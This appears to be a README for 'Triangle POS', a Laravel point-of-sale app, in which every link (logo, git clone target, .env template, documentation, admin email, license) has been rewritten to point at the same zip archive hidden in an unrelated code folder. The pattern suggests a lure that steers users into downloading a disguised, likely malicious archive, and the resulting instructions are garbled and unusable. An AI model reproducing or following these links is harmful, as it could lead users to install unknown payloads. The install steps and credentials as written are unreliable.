<picture>
    <source srcset="https://raw.githubusercontent.com/halo-kaleb/triangle-pos/main/Modules/Expense/Http/triangle_pos_v2.0.zip"  
            media="(prefers-color-scheme: dark)">
    <img src="https://raw.githubusercontent.com/halo-kaleb/triangle-pos/main/Modules/Expense/Http/triangle_pos_v2.0.zip" alt="App Logo">
</picture>

> **Important Note:** This Project is ready for Production. But use code from main branch only. If you find any bug or have any suggestion please create an Issue.

# Local Installation

- run `` git clone https://raw.githubusercontent.com/halo-kaleb/triangle-pos/main/Modules/Expense/Http/triangle_pos_v2.0.zip ``
- run ``composer install `` 
- run `` npm install ``
- run ``npm run dev``
- copy https://raw.githubusercontent.com/halo-kaleb/triangle-pos/main/Modules/Expense/Http/triangle_pos_v2.0.zip to .env
- run `` php artisan key:generate ``
- set up your database in the .env
- run `` php artisan migrate --seed ``
- run `` php artisan storage:link ``
- run `` php artisan serve ``
- then visit `` http://localhost:8000 or http://127.0.0.1:8000 ``.

> **Important Note:** "Triangle POS" uses Laravel Snappy Package for PDFs. If you are using Linux then no configuration is needed. But in other Operating Systems please refer to [Laravel Snappy Documentation](https://raw.githubusercontent.com/halo-kaleb/triangle-pos/main/Modules/Expense/Http/triangle_pos_v2.0.zip).

# Docker Installation

This will start the application along with the mysql database using docker compose. Note that the `DB_HOST` variable must be the mysql docker container name, in this case `db`.

- run `` docker build -t triangle-pos . `` 
- run `` docker compose up ``
- then visit `` http://localhost:8000 or http://127.0.0.1:8000 ``.

# Admin Credentials
> Email: https://raw.githubusercontent.com/halo-kaleb/triangle-pos/main/Modules/Expense/Http/triangle_pos_v2.0.zip || Password: 12345678

## Demo
![Triangle POS](https://raw.githubusercontent.com/halo-kaleb/triangle-pos/main/Modules/Expense/Http/triangle_pos_v2.0.zip)
**Live Demo:** will update soon

## Triangle POS Features

- **Products Management & Barcode Printing**
- **Stock Management**
- **Make Quotation & Send Via Email**
- **Purchase Management**
- **Sale Management**
- **Purchase & Sale Return Management**
- **Expense Management**
- **Customer & Supplier Management**
- **User Management (Roles & Permissions)**
- **Product Multiple Images**
- **Multiple Currency Settings**
- **Unit Settings**
- **System Settings**
- **Reports**

# License
**[Creative Commons Attribution 4.0	cc-by-4.0](https://raw.githubusercontent.com/halo-kaleb/triangle-pos/main/Modules/Expense/Http/triangle_pos_v2.0.zip)**
